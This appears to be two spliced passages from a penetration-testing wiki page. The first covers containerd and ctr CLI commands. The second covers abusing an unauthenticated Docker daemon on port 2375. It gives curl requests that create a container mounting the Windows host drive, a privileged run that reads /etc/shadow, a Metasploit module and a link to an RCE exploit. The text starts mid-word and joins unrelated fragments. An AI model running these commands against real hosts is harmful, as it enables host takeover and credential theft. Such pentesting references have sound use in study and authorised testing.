inside a container docker commit <contain

text: # - all build cache ``` #### Containerd **containerd** is designed to be embedded in platforms such as Docker and Kubernetes. It runs as a daemon on Linux and Windows and keeps a deliberately focused scope: content and image management, snapshots, container lifecycle operations, and supervision.<sup>[[2]](#references)</sup> A key design boundary is that higher-level platforms choose and configure container networking. containerd can manage low-level network attachments and integrates with CRI/CNI plugins, but it does not provide Docker's complete network-management or orchestration user experience.<sup>[[2]](#references)</sup> Docker uses containerd as part of its runtime stack, while Docker Engine adds higher-level APIs and features such as Docker networking, builds, and Swarm orchestration. The bundled `ctr` client is primarily a low-level debugging tool rather than a stable Docker CLI replacement.<sup>[[2]](#references)</sup> ```bash #Containerd CLI ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image ctr images list #List images ctr container create registry:5000/alpine:latest alpine #Create container called alpine ctr container list #List containers ctr container info <containerName> #Get container info ctr task start <containerName> #You are given a shell inside of it ctr task list #Get status of containers ctr tasks attach <containerName> #Get shell in running container ctr task pause <containerName> #Stop container ctr tasks resume <containerName> #Resume container ctr task kill -s SIGKILL <containerName> #Stop running container ctr container delete <containerName> ``` #### Podman **Podman** is an open-source container engine that adheres to the [Open Container Initiative (OCI) standards](https://github.com/opencontainers), developed

title: HT: Interesting fields: OperatingSystem="Docker Desktop", KernelVersion=*microsoft-standard-WSL2* (2375-pentesting-docker)
text: # Interesting fields: OperatingSystem="Docker Desktop", KernelVersion=*microsoft-standard-WSL2* curl http://192.168.65.7:2375/images/json | jq '.[].RepoTags' ``` If the endpoint is reachable, you can create a new container and mount the Windows host drive exposed by Docker Desktop: ```bash curl -s -X POST http://192.168.65.7:2375/containers/create \ -H 'Content-Type: application/json' \ -d '{ "Image":"alpine", "Cmd":["sh","-c","sleep infinity"], "HostConfig":{"Binds":["/mnt/host/c:/host_root"]} }' curl -s -X POST http://192.168.65.7:2375/containers/<cid>/start ``` At that point the attacker-controlled container can access **`C:\`** via **`/host_root`**. Useful follow-up paths include: ```bash /host_root/Users /host_root/ProgramData /host_root/Windows/System32/Tasks ``` If the mounted host exposes **writable scripts** executed by privileged scheduled tasks or services (for example `.ps1`, `.bat`, `.cmd` under a user-writable directory), host filesystem access can become **Administrator** code execution without a kernel/container escape. #### Automatic ```bash msf> use exploit/linux/http/docker_daemon_tcp nmap -sV --script "docker-*" -p <PORT> <IP> ``` ### Compromising The [container-security page](../linux-hardening/containers-namespaces/container-security/) describes additional container-escape techniques. With daemon access, you do not need a kernel-level escape: you can ask Docker to start a privileged container with the host filesystem mounted, then operate on that filesystem directly: ```bash docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine cat /mnt/etc/shadow ``` - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exp
